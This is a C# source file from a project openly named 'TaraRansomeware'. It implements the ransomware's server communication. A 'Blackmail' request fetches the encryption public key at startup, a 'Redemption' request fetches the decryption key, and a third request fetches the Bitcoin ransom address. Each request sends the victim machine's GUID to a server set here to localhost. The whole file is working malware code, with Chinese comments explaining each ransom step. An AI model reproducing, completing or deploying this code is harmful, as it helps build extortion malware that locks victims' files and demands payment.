using Org.BouncyCastle.Utilities.Encoders;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;

namespace TaraRansomeware
{
    internal class HttpUtils
    {
        /// <summary>
        /// 声明HTTP服务器的协议、IP地址、端口
        /// </summary>
        private static readonly string baseUrl = "http://localhost:8080/";

        /// <summary>
        /// 服务器接受的动作类型
        /// </summary>
        public enum PostAction
        {
            /// <summary>
            /// 勒索 请求发生于程序运行开始时，向服务器请求加密所需公钥
            /// </summary>
            Blackmail,
            /// <summary>
            /// 赎回 请求发生于用户点击“解密”按钮时，向服务器请求解密所需私钥
            /// </summary>
            Redemption,
            /// <summary>
            /// 比特币地址 请求发生于首次加密结束之后，向服务器请求支付赎金所需的比特币地址
            /// </summary>
            BTCAddress
        };

        /// <summary>
        /// 发送HTTP请求
        /// </summary>
        /// <param name="guid">用户机器的唯一识别码，POST给服务器以供服务器计算密钥</param>
        /// <param name="action">请求动作类型</param>
        /// <returns>动作所需密钥</returns>
        public static async Task<string> httpreq(byte[] guid, PostAction action)
        {
            string url = baseUrl;

            switch (action)
            {
                case PostAction.Blackmail: url += "blackmail"; break;
                case PostAction.Redemption: url += "redemption"; break;
                case PostAction.BTCAddress: url += "btcaddress"; break;
                default: break;
            }

            using (HttpClient client = new HttpClient())
            {
                FormUrlEncodedContent content = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("guid", Hex.ToHexString(guid))
                });

                HttpResponseMessage response = await client.PostAsync(url, content);
                response.EnsureSuccessStatusCode();

                return await response.Content.ReadAsStringAsync();
            }
        }
    }
}

